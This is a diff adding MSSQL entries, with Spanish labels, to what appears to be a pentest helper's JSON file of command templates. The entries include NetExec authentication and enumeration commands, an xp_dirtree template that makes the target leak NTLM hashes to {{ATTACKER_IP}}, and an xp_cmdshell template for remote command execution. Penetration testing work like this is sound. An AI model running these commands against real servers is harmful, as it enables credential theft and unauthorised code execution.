@@ -262,5 +262,53 @@
     "auth": "password",
     "group": "LDAP",
     "subgroup": "Enumeración LDAP"
+  },
+  "nxc_mssql_auth": {
+    "label": "MSSQL - Autenticación básica",
+    "template": "nxc mssql {{IP}} -u '{{USER}}' -p '{{PASSWORD}}'",
+    "auth": "password",
+    "group": "MSSQL"
+  },
+  "nxc_mssql_auth_domain": {
+    "label": "MSSQL - Autenticación con dominio",
+    "template": "nxc mssql {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' -d {{DOMAIN}}",
+    "auth": "password",
+    "group": "MSSQL"
+  },
+  "nxc_mssql_auth_local": {
+    "label": "MSSQL - Autenticación local",
+    "template": "nxc mssql {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --local-auth",
+    "auth": "password",
+    "group": "MSSQL"
+  },
+  "nxc_mssql_port_custom": {
+    "label": "MSSQL - Puerto personalizado",
+    "template": "nxc mssql {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --port {{PORT}}",
+    "auth": "password",
+    "group": "MSSQL"
+  },
+  "nxc_mssql_query_databases": {
+    "label": "MSSQL - Listar bases de datos",
+    "template": "nxc mssql {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' -q 'SELECT name FROM master.dbo.sysdatabases;'",
+    "auth": "password",
+    "group": "MSSQL"
+  },
+  "nxc_mssql_xp_dirtree": {
+    "label": "MSSQL - Hash Stealing (xp_dirtree)",
+    "template": "nxc mssql {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' -q 'EXEC Master.dbo.xp_dirtree \"\\\\\\\\{{ATTACKER_IP}}\\\\x\",1,1'",
+    "auth": "password",
+    "group": "MSSQL"
+  },
+  "nxc_mssql_xp_cmdshell": {
+    "label": "MSSQL - RCE (xp_cmdshell)",
+    "template": "nxc mssql {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' -x '{{COMMAND}}'",
+    "auth": "password",
+    "group": "MSSQL"
+  },
+  "impacket_mssqlclient": {
+    "label": "Impacket - MSSQL Client (Windows Auth)",
+    "template": "impacket-mssqlclient {{USER}}:'{{PASSWORD}}'@{{IP}} -port {{PORT}} -windows-auth",
+    "auth": "password",
+    "group": "MSSQL"
   }
 }
